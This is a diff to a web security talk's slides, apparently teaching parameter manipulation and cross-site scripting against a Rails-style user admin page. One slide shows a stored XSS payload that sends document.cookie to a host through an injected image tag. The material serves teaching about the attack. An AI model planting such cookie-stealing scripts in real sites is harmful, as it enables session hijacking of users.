@@ -12,9 +12,12 @@
 !SLIDE
 ### Parameter Manipulation ##
 	@@@ html
-	<form accept-charset="UTF-8" action="/users" method="post">
-	<input id="user_email" name="user[email]" size="30" type="text" value="" />
-	<input id="user_password" name="user[password]" size="30" type="password" />
+	<form accept-charset="UTF-8" action="/users" 
+    method="post">
+	<input id="user_email" name="user[email]" 
+    size="30" type="text" value="" />
+	<input id="user_password" name="user[password]" 
+    size="30" type="password" />
 	<input type="submit" value="Create" />
 	</form>
 
@@ -36,6 +39,10 @@
 
 !SLIDE full-page
 ![Here we see an admin saved screenshot ...](admin_saved.png)
+
+
+!SLIDE bullets incremental
+* This kind of flaw reveals a *lack of server side validations* or *defective authorization logic*
 
 
 !SLIDE bullets incremental full-page
@@ -112,11 +119,16 @@
 ![Here we see an succesful attack screen ...](xss3.png)
 
 
-!SLIDE
+!SLIDE small
     @@@ html
     <tr>
       <td><a href="/users/2">poor@test.com</a></td>
-      <td><script>document.write('<img src="http://localhost:80/' + document.cookie + '" >')</script></td>
+      <td>
+        <script>
+          document.write('<img src="http://localhost:80/' + 
+          document.cookie + '" >')
+        </script>
+      </td>
       <td>Employee</td>
       <td>5.0</td>
       <td>
@@ -124,7 +136,8 @@
         |
         <a href="/users/2/edit">Edit</a>
         |
-        <a href="/users/2" data-confirm="Are you sure?" data-method="delete" rel="nofollow">Destroy</a>
+        <a href="/users/2" data-confirm="Are you sure?" 
+          data-method="delete" rel="nofollow">Destroy</a>
       </td>
     </tr>
 
